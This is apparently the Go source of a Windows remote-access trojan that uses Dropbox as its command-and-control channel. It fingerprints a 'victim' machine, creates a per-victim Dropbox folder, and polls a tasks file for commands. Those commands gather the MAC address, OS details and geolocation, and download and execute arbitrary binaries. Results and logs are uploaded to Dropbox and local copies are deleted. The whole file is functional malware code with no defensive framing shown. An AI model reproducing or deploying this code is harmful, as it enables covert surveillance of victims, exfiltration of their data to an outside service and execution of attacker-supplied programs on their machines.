package main
import (
	"fmt"
	"encoding/json"
	"net/http"
	"io/ioutil"
	"bytes"
	"os/exec"
	"encoding/hex"
	"crypto/sha1"
	"time"
	"os"
	"strings"
	"strconv"
	"github.com/levigross/grequests"
)

var (
	client = &http.Client{}
	token = ""
	logFileName = "log.txt"
	UUID string
)

func initInfection() {
	//will generate a UUID, create a folder for specific infected user, then will create a log file and another file that will contain basic data about the infected machine

	//generating victim's UUID
	hostname, _ := exec.Command("cmd.exe", "/C", "hostname").Output()
	username, _ := exec.Command("cmd.exe", "/C", "whoami").Output()
	macaddress, _ := exec.Command("cmd.exe", "/C", "getmac").Output()
	beg := string(hostname) + "-" + string(username) + "-" + string(macaddress)
	hashGen := sha1.New()
	hashGen.Write([]byte(beg))
	UUID = hex.EncodeToString(hashGen.Sum(nil))
	userFolder := "/" + UUID
	if folderExists(UUID) {
		fmt.Println("Folder detected, skipping creation of unique victim folder...")
	} else {
		fmt.Println("Unique victim folder not created, creating one...")
		var bearer = "Bearer " + token
		//dataParam1 contains folder name to create
		dataParam1 := []interface{} {userFolder}
		dataParam2 := []interface{} {false}	
		requestParams, _ := json.Marshal(map[string]interface{} {
			"path": dataParam1[0],
			"autorename": dataParam2[0],
		})
		r, _ := http.NewRequest("POST", "https://api.dropboxapi.com/2/files/create_folder_v2", bytes.NewBuffer(requestParams))
		r.Header.Add("Authorization", bearer)
		r.Header.Add("Content-Type", "application/json")
		resp, _ := client.Do(r)
		respbody, _ := ioutil.ReadAll(resp.Body)
		fmt.Println(string(respbody))
		resp.Body.Close()
	}
	logFileWriter(userFolder, "Victim check in")
	return
}

//will check if log file exists, if not it will create it. if it does, it downloads it & adds onto the event
//dbFolder - folder where log file is located
//data - event to write to log file
func logFileWriter(dbFolder string, data string) {
	dbLogPath := dbFolder + "/" + logFileName
	fullLogPath := os.Getenv("USERPROFILE") + "\\" + logFileName
	if fileExists(dbFolder, logFileName) {
		//response when requesting a download is the raw data of the file. So take respbody2 & write that to a file then add on to it then reupload
		fmt.Println("log file already exists. Downloading & writing new event to it...")
		respbody2 := downloadDBFile(dbLogPath)
		//creating log file & writing new events to it
		fmt.Println("Writing new events to log file...")
		t := time.Now()
		timestamp := t.String()
		f, _ := os.Create(fullLogPath)
		f.WriteString(string(respbody2))
		f.WriteString("[" + timestamp + "]" + "\t" + data + "\n")
		f.Close()
		fmt.Println("Uploading log file...")
		rawFileUpload(fullLogPath, dbLogPath)
		fmt.Println("log file uploaded! Removing log file from local system...")
		_ = os.Remove(fullLogPath)
		return
	} else {
		fmt.Println("log file not found. Creating one...")
		t := time.Now()
		timestamp := t.String()
		f, _ := os.Create(fullLogPath)
		f.WriteString("[" + timestamp + "]" + "\t" + data + "\n")
		f.Close()
		fmt.Println("uploading log file...")
		//reads content of log file & uploads the raw data to the dropbox api
		rawFileUpload(fullLogPath, dbLogPath)
		fmt.Println("log file uploaded! Removing log file from local system...")
		_ = os.Remove(fullLogPath)
		return
	}
}

//uploads result of executed command
//creates a file name (name of file will be hash of result variable) & writes the result of the executed command to the file & uploads that file
func cmdResultUploader(result string) {
	t := time.Now()
	localFileNameGen := sha1.New()
	dbFullPath := "/" + UUID + "/" + "results-" + t.Format("01-02-2006--15:04") + ".txt"

	localFileNameGen.Write([]byte(result))
	localFullPath := os.Getenv("USERPROFILE") + "\\" + hex.EncodeToString(localFileNameGen.Sum(nil))
	f, _ := os.Create(localFullPath)
	f.WriteString(result)
	f.Close()
	rawFileUpload(localFullPath, dbFullPath)
	_ = os.Remove(localFullPath)
	return
}


//returns raw data of file to download
//if dbFilePath isn't prefixed with "/", then it adds it.
func downloadDBFile(dbFilePath string) string {
	var dbFilePathPrefixed string
	if !strings.HasPrefix(dbFilePath, "/") {
		dbFilePathPrefixed = "/" + dbFilePath
		var bearer = "Bearer " + token
		downloadParams, _ := json.Marshal(map[string]string {
			"path": dbFilePathPrefixed,
		})
		r2, _ := http.NewRequest("POST", "https://content.dropboxapi.com/2/files/download", nil)
		r2.Header.Add("Authorization", bearer)
		r2.Header.Add("Dropbox-API-Arg", string(downloadParams))
		resp2, _ := client.Do(r2)
		respbody2, _ := ioutil.ReadAll(resp2.Body)
		resp2.Body.Close()
		return string(respbody2)
	} else {
		var bearer = "Bearer " + token
		downloadParams, _ := json.Marshal(map[string]string {
			"path": dbFilePath,
		})
		r2, _ := http.NewRequest("POST", "https://content.dropboxapi.com/2/files/download", nil)
		r2.Header.Add("Authorization", bearer)
		r2.Header.Add("Dropbox-API-Arg", string(downloadParams))
		resp2, _ := client.Do(r2)
		respbody2, _ := ioutil.ReadAll(resp2.Body)
		resp2.Body.Close()
		return string(respbody2)
	}
}
//reads content of local file & uploads the raw data to the dropbox api
//localFilePath = local file path of file to upload
//externalDBFilePath = desired path in Dropbox to upload file to
func rawFileUpload(localFilePath string, externalDBFilePath string) {
	var bearer = "Bearer " + token
	uploadParamBool := []interface{} {true, false}
	uploadParams, _ := json.Marshal(map[string]interface{} {
		"path": externalDBFilePath,
		"mode": "overwrite",
		"autorename": uploadParamBool[0],
		"mute": uploadParamBool[1],
		"strict_conflict": uploadParamBool[1],
	})
	fileData, _ := ioutil.ReadFile(localFilePath)
	//r2, _ := http.NewRequest("POST", "https://content.dropboxapi.com/2/files/upload", bytes.NewBuffer([]byte(fileData)))
	r2, _ := http.NewRequest("POST", "https://content.dropboxapi.com/2/files/upload", bytes.NewBuffer(fileData))
	r2.Header.Add("Authorization", bearer)
	r2.Header.Add("Dropbox-API-Arg", string(uploadParams))
	r2.Header.Add("Content-Type", "application/octet-stream")
	resp2, _ := client.Do(r2)
	respbody2, _ := ioutil.ReadAll(resp2.Body)
	fmt.Println(string(respbody2))
	resp2.Body.Close()
	return
}

//if file exists, returns true, otherwise returns false
//dbFolderName - folder to look in
//dbFileName - specific file name to look for
func fileExists(dbFolderName string, dbFileName string) bool {
	var bearer = "Bearer " + token
	fmt.Printf("Folder name to search: %s\n", dbFolderName)
	dataParamBool := []interface{} {true, false}
	requestParams, _ := json.Marshal(map[string]interface{} {
		"path": dbFolderName,
		"recursive": dataParamBool[0],
		"include_deleted": dataParamBool[1],
		"include_has_explicit_shared_members": dataParamBool[1],
		"include_mounted_folders": dataParamBool[0],
		"include_non_downloadable_files": dataParamBool[0],
	})
	r, _ := http.NewRequest("POST", "https://api.dropboxapi.com/2/files/list_folder", bytes.NewBuffer(requestParams))
	r.Header.Add("Authorization", bearer)
	r.Header.Add("Content-Type", "application/json")
	resp, _ := client.Do(r)
	respbody, _ := ioutil.ReadAll(resp.Body)
	resp.Body.Close()
	jmap := make(map[string]interface{})
	err := json.Unmarshal([]byte(string(respbody)), &jmap)
	if err != nil {
		fmt.Println(err)
	}
	exists := 0
	fileEntries := jmap["entries"].([]interface{})
	for i:=0; i<=len(fileEntries)-1; i++ {
		fileEntry := fileEntries[i].(map[string]interface{})
		if fileEntry["name"].(string) == dbFileName {
			fmt.Println("file exists!")
			return true
		} else {
			exists = 0
		}
	}
	if exists == 0 {
		fmt.Println("File doesn't exist!")
		return false
	} else {
		return true
	}
}

//do not prepend a slash to argument (dbFolderName) since Dropbox API simply returns the name with no slashes
func folderExists(dbFolderName string) bool {
	var bearer = "Bearer " + token
	fmt.Printf("Folder name to search: %s:\n", dbFolderName)
	dataParamBool := []interface{} {true, false}
	requestParams, _ := json.Marshal(map[string]interface{} {
		"path": "",
		"recursive": dataParamBool[0],
		"include_deleted": dataParamBool[1],
		"include_has_explicit_shared_members": dataParamBool[1],
		"include_mounted_folders": dataParamBool[0],
		"include_non_downloadable_files": dataParamBool[0],
	})
	r, _ := http.NewRequest("POST", "https://api.dropboxapi.com/2/files/list_folder", bytes.NewBuffer(requestParams))
	r.Header.Add("Authorization", bearer)
	r.Header.Add("Content-Type", "application/json")
	resp, _ := client.Do(r)
	respbody, _ := ioutil.ReadAll(resp.Body)
	resp.Body.Close()
	jmap := make(map[string]interface{})
	err := json.Unmarshal([]byte(string(respbody)), &jmap)
	if err != nil {
		fmt.Println(err)
	}
	exists := 0
	fileEntries := jmap["entries"].([]interface{})
	for i:=0; i<=len(fileEntries)-1; i++ {
		fileEntry := fileEntries[i].(map[string]interface{})
		if fileEntry["name"].(string) == dbFolderName {
			fmt.Println("Folder exists!")
			return true
		} else {
			exists = 0
		}
	}
	if exists == 0 {
		fmt.Println("Folder doesn't exist!")
		return false
	} else {
		return true
	}
}

//uses ip-api.com's api to grab location info
func locationInfoGather() string {
	r, _ := http.NewRequest("GET", "http://ip-api.com/json/?fields=status,message,country,region,regionName,city,zip,lat,lon,timezone,isp,org,as,proxy,query", nil)
	resp, _ := client.Do(r)
	respbody, _ := ioutil.ReadAll(resp.Body)
	resp.Body.Close()
	jmap := make(map[string]interface{})
	_ = json.Unmarshal([]byte(string(respbody)), &jmap)
	locationInfo := "Ip address: " + jmap["query"].(string) + "\n" + "Location info: " + jmap["city"].(string) + ", " + jmap["regionName"].(string) + " " + jmap["country"].(string) + " " + jmap["zip"].(string) + "\n" + "ISP: " + jmap["isp"].(string) + "\n" + "isProxy: " + strconv.FormatBool(jmap["proxy"].(bool)) + "\n" + "Approx. Coordinates: " + strconv.FormatFloat(jmap["lat"].(float64), 'f', -1, 64) + " " + strconv.FormatFloat(jmap["lon"].(float64), 'f', -1, 64)
	return locationInfo
}

func downloadNExecute(url string, filename string, environmentVariable string) {
	uuidFullPath := "/" + UUID
	response, err := grequests.Get(url, nil)
	if err != nil {
		errorMsg := string(err.Error()) + " : encountered this error while making request to url provided in downloadNexecute cmd"
		logFileWriter(uuidFullPath, errorMsg)
		return
	} else {
		path := os.Getenv(environmentVariable) + "\\" + filename
		response.DownloadToFile(path)
		o, err := exec.Command("cmd.exe", "/c", path).Output()
		if err != nil {
			errorMsg := string(err.Error()) + " : encountered this error while attempting to execute binary downloaded from url provided in downloadNexecute cmd"
			logFileWriter(uuidFullPath, errorMsg)
			_ = os.Remove(path)
			return
		}
		fmt.Println("Writing results of execution to log file...")
		cmdResultUploader(string(o))
		return
	}
}

func main() {
	initInfection()
	cmd := downloadDBFile("tasks.txt")
	cmdNoNls := strings.Split(cmd, "\n")
	fmt.Printf("received cmd: %s\n", cmd)
	cmdSplit := strings.Split(cmdNoNls[0], "+-")
	uuidFullPath := "/" + UUID
	//all cmds must at least have two parts [who it's addressed to]+-[what the cmd is]
	if len(cmdSplit) < 2 {
		logFileWriter(uuidFullPath, "Issued command has less than 2 parts. At minimum, it must have 2 parts: [who it's addressed to]+-[what the cmd is]. Please see the guide for list of available commands and their accompanying arguments.")
		return
	}
	if cmdSplit[0] == UUID || cmdSplit[0] == "everyone" {
		fmt.Println("Command meant for us.")
		if cmdSplit[1] == "GMac" {
			fmt.Println("Grab mac address cmd received...")
			mac, err := exec.Command("cmd.exe", "/c", "getmac").Output()
			if err != nil {
				fmt.Println("Error encountered!")
				logFileWriter(uuidFullPath, string(err.Error()))
			} else {
				fmt.Println("Uploading result of cmd...")
				cmdResultUploader(string(mac))
			}
		} else if cmdSplit[1] == "profile" {
			fmt.Println("Profile cmd received...")
			osV, err := exec.Command("cmd.exe", "/c", "wmic", "os", "get", "Caption,CSDVersion", "/value").Output()
			osA, err2 := exec.Command("cmd.exe", "/c", "wmic", "os", "get", "OSArchitecture").Output()
			if err != nil || err2 != nil {
				fmt.Println("Error encountered!")
				fmt.Println(err)
				fullError := string(err.Error()) + " " + string(err2.Error())
				logFileWriter(uuidFullPath, fullError)
			} else {
				fmt.Println("Uploading result of cmd...")
				osInfo := string(osV) + "\n" + string(osA)
				cmdResultUploader(osInfo)
			}
		} else if cmdSplit[1] == "location" {
			fmt.Println("Location grab command received. Running appropriate function...")
			locationResult := locationInfoGather()
			cmdResultUploader(locationResult)
		} else if cmdSplit[1] == "downloadNexecute" {
			fmt.Println("Download and execute command received. Verifying link is present...")
			//we check length of command acquired from Dropbox, if it has length less than 5, we exit since the downloadNexecute command requires at least 5 parts which are explained in the readme
			if len(cmdSplit) < 5 {
				logFileWriter(uuidFullPath, "Insufficient amount of arguments! Download and execute command must have 5 arguments: [who it's addressed to]+-[downloadNexecute]+-[link to binary to download & execute]+-[filename for binary when dropped on machine]+-[environment variable of where to drop it (EX: TMP, APPDATA, USERPROFILE)]")
				return
			} else {
				fmt.Printf("Download binary from %s and naming it %s and dropping it into %s...\n", cmdSplit[2], cmdSplit[3], cmdSplit[4])
				downloadNExecute(cmdSplit[2], cmdSplit[3], cmdSplit[4])
			}	
		}
	}
}
